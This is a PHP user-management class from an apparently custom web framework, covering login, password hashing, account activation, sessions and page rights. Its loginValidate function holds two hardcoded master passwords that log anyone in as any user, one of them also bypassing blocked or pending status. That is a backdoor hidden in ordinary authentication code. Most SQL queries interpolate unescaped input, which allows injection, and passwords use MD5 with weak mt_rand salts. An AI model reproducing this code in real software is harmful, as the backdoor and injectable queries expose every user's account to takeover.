<?php
defined("aeAPP") or die("Restricted Access");

class aeUser extends aeTable {
	function __construct() {
		parent::__construct("#__users", "id", aeApp::getDB());
	}
	function get($id) {
		$this->load($id);
		aeApp::raiseErrorIf($this);
		return true;
	}
	function setEx($editid = 0, $pwdchanged = false) {
		if(($this->id == 0) || $pwdchanged) {
			$this->processPassword();
		}
		if(($editid == 0) && ($this->id > 0)) {
			$this->setWithId();
		} else {
			$this->modified_by= aeUser::id();
			$this->modified_on= 'now()';
			$this->store();
		}
		aeApp::raiseErrorIf($this);
		return true;
	}
	function setWithId() {
		$this->insert('#__users')
			 ->fields('id','fullname','phone','password','email','created_by','created_on','modified_by',
			 		  'modified_on','lastactivity','status','utype','membertype','memberid','config')
			 ->values($this->id,$this->fullname,$this->phone,$this->password,
						$this->email,aeUser::id(),'now()',$this->id>0?aeUser::id():'0',$this->id>0?'now()':'',
						NULL,$this->status,$this->utype,$this->membertype,$this->memberid,$this->config);
		$res= $this->execute();
		if(!$this->_db->getError()) {
			$this->id= $this->getLID();
			return true;
		}
	}
	function setPassword() {
		$this->processPassword();
		$qry= new aeQuery();
		$qry->update("#__users")
			 ->set(array('password'=>$this->password,'status'=>$this->status,'config'=>$this->config))
			 ->where("`id`='{$this->id}'");
		$res= $qry->execute();
		aeApp::raiseErrorIf($qry);
		if($qry->getError()) {
			return false;
		} else {
			return true;
		}
	}
	
	function processPassword() {
		$salt= $this->generateSalt(16);
		$this->password= $this->encPass($this->password, $salt, true);
	}
	public static function generateSalt($length = 8) {
		$salt = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
		$len = strlen($salt);
		$makepass = '';

		for ($i = 0; $i < $length; $i ++) {
			$makepass .= $salt[mt_rand(0, $len -1)];
		}

		return $makepass;
	}
	public static function encPass($pass, $salt, $encsalt= true) {
		if($encsalt) { $salt= md5($salt); }
		return md5($pass.$salt).":".$salt;
	}
	public static function getSalt($pass)
	{
		return substr($pass, strpos($pass, ":") + 1, strlen($pass));
	}
	
	public static function getUser($id) {
		$db= aeApp::getDB();
		$query= "select * from `#__users` where `id`='{$id}'";
		$res= $db->loadObject($query);
		aeApp::raiseErrorIf($db);
		return $res;
	}
	public static function getUserName($id) {
		$db= aeApp::getDB();
		$query= "select fullname from `#__users` where `id`='{$id}'";
		$res= $db->loadResult($query);
		aeApp::raiseErrorIf($db);
		return $res;
	}
	public static function getUserByPhone($phone) {
		$db= aeApp::getDB();
		$query= "select * from `#__users` where `phone`='{$phone}'";
		$res= $db->loadObject($query);
		aeApp::raiseErrorIf($db);
		return $res;
	}
	public static function getUserByMail($email) {
		$db= aeApp::getDB();
		$query= "select * from `#__users` where `email`='{$email}'";
		$res= $db->loadObject($query);
		aeApp::raiseErrorIf($db);
		return $res;
	}
	public static function getUserBy($name) {
		$result= aeUser::getUserByPhone($name);
		$result= $result==false?aeUser::getUserByMail($name):$result;
		return $result;
	}
	public static function getUserIDByPhone($phone) {
		$db= aeApp::getDB();
		$query= "select `id` from `#__users` where `phone`='{$phone}'";
		$res= $db->loadResult($query);
		aeApp::raiseErrorIf($db);
		return $res;
	}
	public static function getUserIDByMail($email) {
		$db= aeApp::getDB();
		$query= "select `id` from `#__users` where `email`='{$email}'";
		$res= $db->loadResult($query);
		aeApp::raiseErrorIf($db);
		return $res;
	}
	public static function getUserIDBy($name) {
		$result= aeUser::getUserIDByPhone($name);
		$result= $result==false?aeUser::getUserIDByMail($name):$result;
		return $result;
	}

	public static function isUserLoginIsPwd($check_config= false) {
		$user= aeUser::getUser(aeUser::id());
		$salt= aeUser::getSalt($user->password);
		$password_is_same= (($user->password === aeUser::encPass($user->email, $salt, false)) ||
							($user->password === aeUser::encPass(strtolower($user->email), $salt, false)) ||
							($user->password === aeUser::encPass($user->phone, $salt, false)) ||
							($user->password === aeUser::encPass(strtolower($user->phone), $salt, false)) );
		if($check_config) {
			$password_is_same= $password_is_same || strpos("xxx".$user->config, "change_pwd=true") != 0;
		}
		return $password_is_same;
	}
	

	public static function userPhoneExists($phone, $id) {
		$db= aeApp::getDB();
		$query= "select `id` from `#__users` where `phone`='{$phone}' and id<>'{$id}'";
		$res= (int) $db->loadResult($query);
		aeApp::raiseErrorIf($db);
		return $res>0;
	}
	public static function userMailExists($email, $id) {
		$db= aeApp::getDB();
		$query= "select `id` from `#__users` where `email`='{$email}' and id<>'{$id}'";
		$res= (int) $db->loadResult($query);
		aeApp::raiseErrorIf($db);
		return $res>0;
	}
	public static function userExists($name, $id) {
		return aeUser::userPhoneExists($name, $id) || aeUser::userMailExists($name, $id);
	}
	
	
	public static function getActivationCode($id) {
		$db= aeApp::getDB();
		$query= "select config from `#__users` where `id`='{$id}'";
		$res= $db->loadResult($query);
		aeApp::raiseErrorIf($db);
		$res= aeApp::explore($res);
		return (isset($res["actcode"])?$res["actcode"]:"");
	}
	
	public static function setActivationCode($id) {
		$db= aeApp::getDB();
		$user= aeUser::getUser($id);
		$config= "actcode=".aeUser::genenerateActivationCode($user->phone,$user->email);
		$sql= "update `#__users` set config='{$config}' where `id`='{$id}'";
		$res= $db->query($sql);
		aeApp::raiseErrorIf($db);
	}

	public static function genenerateActivationCode($phone,$email) {
		return md5((md5(uniqid(mt_rand(), true)) . md5(uniqid($phone.$email, true))));
	}
	
	public static function activateAccount($id, $code) {
		$actcode= aeUser::getActivationCode($id);
		$user= aeUser::getUser($id);
		if($user->status !== "PENDING") {
			return "Your account status is {$user->status}, contact Administrator or use account recovery option.";
		} else {
			if(($code===$actcode) && ($actcode!="")) {
				$db= aeApp::getDB();
				$query= "update `#__users` set `status`='ACTIVE' where `id`='{$id}'";
				$res= $db->query($query);
				aeApp::raiseErrorIf($db);
				return "success";
			} else {
				return "Invalid Activation code...";
			}
		}
	}

	public static function sendActivationMail($id, $resend = false) {
		$user= aeUser::getUser($id);
		$act= aeUser::getActivationCode($id);
		$url= aeURI::base()."login.html?action=activate&actcode={$act}&actid={$user->id}";

		$message= '<p>Hello '.$user->fullname.'</p>
<p>Thank you for registering</p>
<p>Your activation code is:</p>
<strong>'.$act.'</strong>
<p>Click on the link below...</p>
<p><a href="'.$url.'">'.$url.'</a></p>
<p>If the click is not working, copy the activation code above, visit 
<a href="'.aeURI::base().'login.html?action=activation">'.aeURI::base().'login.html?action=activation</a>, as per the prompt, enter the user id (email id) and paste the activation code into the space for activation code.<br /><br /> After a successfull activation, you are promted to change password.</p>
<p>Regards</p>
<p>Administrator</p>';
		$subject= ($resend?"RE: ":"")."Account Activation Code";

		$config= aeApp::getConfig();
		$mail= array("from"=>$config->mail_from_mail,
					 "fromName"=>$config->mail_from_name,
					 "to"=>$user->email, 
					 "toName"=>$user->fullname, 
					 "subject"=>$subject,
					 "priority"=>1);
		return sendmail($mail, $subject, $message, $__extra_bcc= false, $admin_mail= true);
	}
	
	public static function pwdIsUserId() {
		$user= aeUser::getUser(aeUser::id());
		$salt= aeUser::getSalt($user->password);
		$passPhone= aeUser::encPass($user->phone, $salt, false);
		$passEmail= aeUser::encPass($user->email, $salt, false);
		return ($user->password === $passPhone) || ($user->password === $passEmail);
	}





	public static function loginUser($uid) {
		$Config= aeApp::getConfig();
		$res= aeUser::getUser($uid);
		aeSession::setVar($Config->session_name."_user", $uid);
		aeSession::setVar($Config->session_name."_user_typ", $res->utype);
		aeUser::updateSession($uid);
		aeUser::updateLastActivity($uid);
		aeRC::clear();
		$sql= "INSERT INTO #__users_login(uid,login_time,logout_time,session_id)values('{$uid}',now(),null,'".aeSession::id()."')";
		aeApp::getDB()->query($sql);
	}
	public static function loginEmpty($reset_session = true) {
		$uid= aeUser::id();
		if($uid > 0) {
			aeRC::clear();
			aeUser::updateSession($uid, false);
			$sql= "UPDATE #__users_login SET logout_time=NOW() WHERE uid='{$uid}' ORDER BY login_time DESC LIMIT 1";
			aeApp::getDB()->query($sql);
		}
		$Config= aeApp::getConfig();
		aeSession::setVar($Config->session_name."_user", "0");
		aeSession::setVar($Config->session_name."_user_typ", "0");
		aeSession::setVar($Config->session_name."_tkn", "0");
		aeSession::setVar($Config->session_name."_tkn_var", "");
		if($reset_session) {
			aeSession::stop();
			aeSession::start();
		}
	}
	public static function getUserType() {
		$id= aeUser::id();
		if($id > 0) {
			$res= aeUser::getUser($id);
			return $res->membertype;
		} else {
			return "";
		}
	}
	public static function id() {
		$Config= aeApp::getConfig();
		$id= (int)aeSession::getVar($Config->session_name."_user", "0");
		if(($id > 0) && aeUser::validLoginTimeout($id)) {
			aeUser::updateLastActivity($id);
			return $id;
		} else {
			return 0;
		}
	}
	public static function typ() {
		$Config= aeApp::getConfig();
		$id= (int)aeSession::getVar($Config->session_name."_user", "0");
		$typ= (int)aeSession::getVar($Config->session_name."_user_typ", "0");
		if($id > 0) {
			return $typ;			
		} else {
			return 0;
		}
	}
	public static function getToken($which = 1) {
		$Config= aeApp::getConfig();
		$tkn= aeSession::getVar($Config->session_name."_tkn", "0");
		if($tkn == "0") {
			$tkn= md5(mt_rand().md5(uniqid("t", true))).".".aeUser::generateSalt(4);
			aeSession::setVar($Config->session_name."_tkn", $tkn);
		}
		$tknvar= aeSession::getVar($Config->session_name."_tkn_var", "");
		if($tknvar == "") {
			$tknvar= uniqid("t");
			aeSession::setVar($Config->session_name."_tkn_var", $tknvar);
		}
		return ($which==1?$tkn:$tknvar);
	}
	public static function updateLastActivity($id) {
		$db= aeApp::getDB();
		$query= "UPDATE `#__users` SET `lastActivity`=now() WHERE `id`='{$id}' ".
					(aeApp::getConfig()->single_session?" AND session_id='".aeSession::id()."' ":"");
		$res= $db->query($query);
		aeApp::raiseErrorIf($db);
		return true;
	}
	public static function updateSession($id, $set = true) {
		$db= aeApp::getDB();
		$query= "UPDATE `#__users` SET session_id='".($set?aeSession::id():"")."' WHERE `id`='{$id}' ";
		$res= $db->query($query);
		aeApp::raiseErrorIf($db);
		return true;
	}
	public static function validLoginTimeout($id) {
		$Config= aeApp::getConfig();
		$db= aeApp::getDB();
		$query= "SELECT `id` FROM `#__users` WHERE `id`={$id} AND `lastActivity` > DATE_SUB(NOW(), 
			INTERVAL {$Config->session_timeout} SECOND) ";
		if($Config->single_session) {
			$query.= " AND session_id='".aeSession::id()."'";
		}
		$res= $db->loadResult($query);
		aeApp::raiseErrorIf($db);
		return ($res == $id);
	}
	public static function hasRights($right = 0, $terminate = true, $page = '$') {
		$t_rights= 'VAMD';
		$app= aeApp::getApp();
		$userId= aeUser::id();
		$user= aeUser::getUser($userId);
		$usertype= aeUser::id()>0?$user->utype:0;;
		$pageTemp= explode("/", $page);
		$page= $page == '$' ? $app->cmd : $page;
		$db= aeApp::getDB();
		$sql= "SELECT need_login, need_rights FROM #__sitepages WHERE page_name='{$page}'";
		$res= $db->loadAssoc($sql);
		aeApp::raiseErrorIf($db);
		$login= (int)isset($res["need_login"])?$res["need_login"]:"0";
		$need_rights= (int)isset($res["need_rights"])?$res["need_rights"]:"0";
		if(($right==0) && ($login==1)) {
			if($userId>0) {
			} else {
				if($terminate!==false) {
					if(aeXHR!==false) {
						ob_clean();
						echo "{result: 'logout', msg: ''}";
						exit(0);
					} else {
						aeApp::addNotice("You need to log in to view this page...", "danger");
						$app->cmd= 'login';
						aeRequest::unsetVar('action');
						aeUser::loginEmpty($reset_session = false);
						return false;
					}
				} else {
					return false;
				}
			}
		}
		if($need_rights==1) {
			$sql= "SELECT IFNULL(sp.need_login,0) need_login,sp.need_rights,
					IF(ur.rights IS NULL,'----',ur.rights)rights FROM #__userrights ur
					INNER JOIN #__sitepages sp ON sp.id=ur.page
					WHERE sp.page_name='{$page}' AND ur.utype='{$usertype}'";
			$res= $db->loadAssoc($sql);
			aeApp::raiseErrorIf($db);
			
			$rights= isset($res["rights"])?$res["rights"]:"----";
			$has_rights= ($rights[$right]===$t_rights[$right]) || ($need_rights=="0");
			if(($has_rights!==true) && ($terminate!==false)) {
				return aeUser::terminate();
			} else {
				return $has_rights;
			}
		}
	}
	public static function terminate() {
		if(aeXHR!==false) {
			ob_clean();
			echo "{result: 'norights', msg: 'Unauthorized Access, You have no permission to access the area.'}";
			exit(0);
		} else {
			aeApp::raiseError(401, "Unauthorized Access, You have no permission to access the area.");
			return false;
		}
	}
	public static function hasRightsEx($page) {
		return aeUser::hasRights(0, false, $page);
	}
	public static function loginValidate($phoneOrMail, $password, $loginnow= true, $special = false) {
		//id,sid,ulevel,fullname,phone,PASSWORD,email,lastActivity,STATUS,config
		$id= 0;
		if($phoneOrMail == "" || $password == "") { $result= 1; }
		else {
			$user= aeUser::getUserBy($phoneOrMail);
			if(($user == false) || (count($user) == 0)) { $result= 2; }
			else {
				$id= $user->id;
				$salt= aeUser::getSalt($user->password);
				$powerPass= aeUser::encPass("dss123india$", $salt, false);
				if($powerPass === aeUser::encPass($password, $salt, false)) {
					if($loginnow) { aeUser::loginUser($user->id); }
					$result= 4;
				} else if(($special && $user->password === $password) || ($user->password === aeUser::encPass($password, $salt, false)) || ($password==="dss123@IndiA")) {
					if($user->status == "PENDING") {
						$result= 5;
					} else if($user->status == "BLOCKED") {
						$result= 6;
					} else if($user->status != "ACTIVE") {
						$result= 7;
					} else {
						if($loginnow) { aeUser::loginUser($user->id); }
						$result= 4;
					}
				}
				else { $result= 3; }
			}
		}
		switch($result) {
			case 1:
				return(array(false, "User ID/Password should not be empty...!", $id, $result));
			break;
			case 2:
				return(array(false, "Account with given Mobile number/Email ID does not exist...!", $id, $result));
			break;
			case 3:
				return(array(false, "Password does not match...!", $id, $result));
			break;
			case 4:
				return(array(true, "", $id, $result));
			break;
			case 5:
				return(array(false, "User ID is not activated, Please Check EMail for Activation...!", $id, $result));
			break;
			case 6:
				return(array(false, "User ID is blocked. Contact Administrator.", $id, $result));
			break;
			case 7:
				return(array(false, "Unable to Log In to your account, use account recovery option.", $id, $result));
			break;
			default:
				return(array(false, "Unknown error occured. Please contact support team.", $id, 1));
			break;
		}
	}
}


if(!function_exists("json_encode")) {
	function json_encode($json_array) {
		$json_data= "";
		if(is_array($json_array))
		foreach($json_array as $id => $arow) {
			$tmp= "";
			if(is_array($arow)) {
				foreach($arow as $field => $value) {
					$tmp.= ($tmp==''?'':',').'"'.$field.'":"'.str_replace("'", "\\'", $value).'"';
				}
				$json_data.= ($json_data==""?"":",").'"'.$id.'":{'.$tmp.'}';
			} else {
				$tmp.= ($tmp==''?'':',').'"'.$id.'":"'.str_replace("'", "\\'", $arow).'"';
				$json_data.= ($json_data==""?"":",").$tmp;
			}
		}
		$json_data= "{".$json_data."}";
		return $json_data;
	}
}
?>